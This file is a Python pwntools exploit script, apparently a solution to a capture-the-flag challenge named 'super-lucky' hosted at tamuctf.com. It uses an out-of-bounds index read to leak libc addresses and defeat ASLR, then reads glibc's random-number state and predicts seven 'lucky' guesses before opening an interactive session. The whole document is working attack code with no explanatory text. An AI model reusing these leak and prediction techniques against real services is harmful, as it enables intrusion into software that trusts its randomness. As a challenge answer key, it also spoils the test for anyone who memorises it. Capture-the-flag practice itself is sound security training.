from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''
			b* rand
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./super-lucky")
libc=ELF("./libc.so.6")
nc="nc azeaz 14"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	p=remote("tamuctf.com", 443, ssl=True, sni="super-lucky")
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass
def leak(address):
	index=(address-0x404040)//4
	p.sendline("{}".format(index))
	p.recvuntil(b': ',timeout=0.5)
	res=int(p.recvline()[:-1],10)
	return res&0xffffffff
############### main exploit    ###############

p.recvuntil(b"777",timeout=0.5)

libc.address=leak(0x403fe8)+(leak(0x403fec)<<32)-0x3b020



rptr=libc.address+0x1ba1c4
fptr=rptr+0xc
leaks=[]
for i in range(19):
	leaks.append(leak(rptr+(4*i)))

for i in leaks:
	print(hex(i))
#debug()

for i in range(7):
	print(str(((leaks[i]+leaks[i+3])&0xffffffff)>>1))
	p.recvuntil(b"Enter guess #")
	p.sendline(str(((leaks[i]+leaks[i+3])&0xffffffff)>>1))
	leaks[i+3]=leaks[i+3]+leaks[i]





p.interactive()